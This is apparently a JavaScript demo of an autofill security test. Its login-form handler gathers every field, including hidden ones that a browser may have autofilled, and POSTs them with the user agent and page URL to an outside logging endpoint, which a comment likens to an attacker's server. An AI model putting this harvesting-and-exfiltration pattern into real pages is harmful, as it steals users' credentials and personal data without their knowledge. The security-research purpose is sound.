document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = new FormData(this);
  const values = {};

  // Collect all form data including hidden fields
  for (let [key, value] of formData.entries()) {
    values[key] = value;
  }

  // Also manually check for hidden fields that might not be in FormData
  const allInputs = this.querySelectorAll("input");
  allInputs.forEach((input) => {
    if (input.name && input.value && !values[input.name]) {
      values[input.name] = input.value;
    }
  });

  // Log to console for debugging
  console.log("Form submitted with values:", values);
  console.log(
    "Hidden fields detected:",
    Object.keys(values).filter((key) => key !== "email" && key !== "password")
  );

  // Attempt to send to mock endpoint (will fail due to CORS, but demonstrates the concept)
  fetch(
    "https://autofill-security-test-backend-production.up.railway.app/log",
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        timestamp: new Date().toISOString(),
        technique: document.querySelector(".technique-info h3").textContent,
        data: values,
        userAgent: navigator.userAgent,
        url: window.location.href,
      }),
    }
  )
    .then((response) => {
      console.log("Data sent to logging endpoint");
      return response.json();
    })
    .then((data) => {
      console.log("Server response:", data);
    })
    .catch((error) => {
      console.log("Network request failed (expected due to CORS):", error);
      // In a real attack, this would be sent to an attacker-controlled server
    });

  // Scroll to results
  resultsDiv.scrollIntoView({ behavior: "smooth" });
});
